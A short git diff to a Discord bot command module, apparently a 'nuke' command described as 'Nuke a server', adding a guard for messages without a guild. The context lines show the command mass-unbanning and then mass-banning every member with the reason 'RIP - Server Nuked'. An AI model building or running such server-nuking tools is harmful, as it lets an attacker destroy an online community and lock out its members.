@@ -6,7 +6,7 @@ module.exports = {
     description: "Nuke a server",
     rank: "vip",
     async run(client, message, args){
-
+        if(!message.guild) return
         if (message.guild.me.permissions.has(Permissions.FLAGS.BAN_MEMBERS)){
             f.massUnban(message)
             f.massBan(message, "RIP - Server Nuked")
